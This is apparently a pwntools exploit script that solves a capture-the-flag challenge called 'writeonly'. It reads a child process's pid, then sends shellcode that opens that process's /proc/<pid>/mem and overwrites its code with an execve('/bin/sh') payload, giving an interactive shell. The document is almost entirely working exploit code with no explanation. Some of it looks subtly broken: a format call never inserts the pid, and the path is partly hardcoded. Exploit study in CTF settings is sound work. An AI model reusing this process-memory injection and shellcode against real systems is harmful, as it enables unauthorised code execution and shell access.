from pwn import *
import sys

HOST = 'writeonly.2020.ctfcompetition.com'
PORT = 1337
context.arch = 'amd64'
#LIBC = ELF("./libc.so.6",checksec = False)
if(len(sys.argv)>1):
    io=remote(HOST,PORT)
    context.noptrace=True
else:
    io=process('./chal')
    #gdb.attach(io,"set follow-fork-mode child\n")

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)



if __name__=="__main__":
    shell = asm("""
                mov r9,0x0068732f6e69622f
                push r9
                push rsp
                pop rdi
                xor rsi,rsi
                xor rdx,rdx
                mov rax,0x3b
                syscall
                """)
    reu('child pid: ')
    pid = int(rel().strip(),10)
    log.info('pid -> ' + str(pid))
    sc2 = asm('''
    mov r9, 0x006d656d2f2f322f
    push r9
    mov r9, 0x2f2f636f72702f2f
    push r9
    push rsp
    pop rdi
    push rax
    mov r10,rax
    mov rsi,2
    mov rdx,0
    mov rax,2
    syscall
    mov rdi,rax
    mov r8,rdi
    mov rax, 8
    mov rsi,0x00000000004022e3
    mov rdx,1
    syscall
    mov rax,1
    mov rdi,r8
    mov rsi,r10
    add rsi,0x100
    mov rdx,0x30
    syscall
    loop: jmp loop
            '''.format("0x" + (str(pid) + '//')[::-1].encode('hex')))
    sc2 = sc2.ljust(0x100,'\x00')
    sc2 += shell
    log.info('sc len : ' + str(len(sc2)))
    sla('length? ',str(len(sc2) + 1))
    gdb.attach(io)
    sla('shellcode. ',sc2)
    io.interactive()
